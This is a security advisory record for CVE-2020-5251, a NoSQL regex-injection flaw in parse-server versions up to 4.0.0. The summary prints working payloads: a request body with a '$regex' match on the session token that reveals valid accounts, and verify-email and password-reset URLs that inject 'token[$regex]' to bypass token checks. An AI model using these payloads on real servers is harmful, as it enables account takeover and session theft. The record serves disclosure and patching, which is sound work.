advisory_id: GHSA-h4mf-75hf-67w4
datasource_id: github_osv_importer_v2/GHSA-h4mf-75hf-67w4
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/03/GHSA-h4mf-75hf-67w4/GHSA-h4mf-75hf-67w4.json
aliases:
  - CVE-2020-5251
summary: |
  Information disclosure in parse-server
  1. you can fetch all the users' objects, by using regex in the NoSQL query.
  Using the NoSQL, you can use a regex on sessionToken `("_SessionToken":{"$regex":"r:027f"}}` and find valid accounts this way.

  Using this method, it's possible to retrieve accounts without interaction from the users.

  GET /parse/users/me HTTP/1.1
  ```
  {
    "_ApplicationId": "appName",
    "_JavaScriptKey": "javascriptkey",
    "_ClientVersion": "js2.10.0",
    "_InstallationId": "ca713ee2-6e60-d023-a8fe-14e1bfb2f300",
    "_SessionToken": {
      "$regex": "r:5"
    }
  }
  ```
  When trying it with an update query the same thing luckily doesn't seem to work:
  POST /parse/classes/_User/PPNk59jPPZ

  2. There is another similar vulnerability in verify email and the request password reset.

  If you sign up with someone else's email address, you can simply use regex in the token param to verify the account: `http://localhost:1337/parse/apps/kickbox/verify_email?token[$regex]=a&username=some@email.com`

  The same thing can be done for reset password: `http://localhost:1337/parse/apps/kickbox/request_password_reset?token[$regex]=a&username=some@email.com`

  You may need to do it a few times with a different letter/number, but as long as the tokens contain the character it will succeed.
impacted_packages:
  - purl: pkg:npm/parse-server
    affected_versions: vers:npm/<=4.0.0
    fixed_versions: vers:npm/4.1.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.7'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/03/GHSA-h4mf-75hf-67w4/GHSA-h4mf-75hf-67w4.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-285
  - CWE-200
references:
  - url: https://github.com/parse-community/parse-server/commit/3a3a5eee5ffa48da1352423312cb767de14de269
    reference_type:
    reference_id:
  - url: https://github.com/parse-community/parse-server/security/advisories/GHSA-h4mf-75hf-67w4
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2020-5251
    reference_type:
    reference_id: CVE-2020-5251
